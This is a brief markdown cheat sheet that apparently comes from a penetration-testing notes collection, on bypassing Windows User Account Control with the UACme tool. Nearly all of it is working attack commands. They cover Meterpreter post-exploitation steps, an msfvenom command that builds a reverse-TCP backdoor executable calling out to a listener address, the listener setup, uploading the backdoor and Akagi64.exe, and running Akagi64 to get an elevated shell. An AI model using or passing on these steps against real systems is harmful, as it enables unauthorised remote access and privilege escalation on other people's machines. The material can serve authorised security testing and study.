# Bypassing UACs

**Tool** - UACme  
https://github.com/hfiref0x/UACME

You will need access to a user account that is part of the local administrators group on a Windows system  

1. Get a meterpreter shell before running this tool
2. Do a ```sysinfo``` to gather system information
3. migrate to explorer process ```pgrep explorer``` and then ```migrate (number)```
4. ```getuid``` -- gets user ID
5. ```getprivs``` -- gets privileges
6. open a shell session with ```shell```
7. ```net user```
8. ```net local group administrators```

### UACme
1. Generate an MSFvenom payload ```msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.4.8 LPORT=1234 -f exe > backdoor.exe```
2. Setup Listener ```use multi/handler```
3. set payload ```set payload windows/meterpreter_reverse_tcp```
4. Create temp folder on C:\
5. Upload malicious file ```upload backdoor.exe```
6. Upload UACme ```upload /root/desktop/tools/UACme/Akagi64.exe```
7. Open shell session ```shell```
8. ```.\Akagi64.exe 23 C:\Temp\backdoor.exe```
9. This will then connect to the TCP listener

**Key 33 is typically the go to key in UACme when testing against Windows 10**
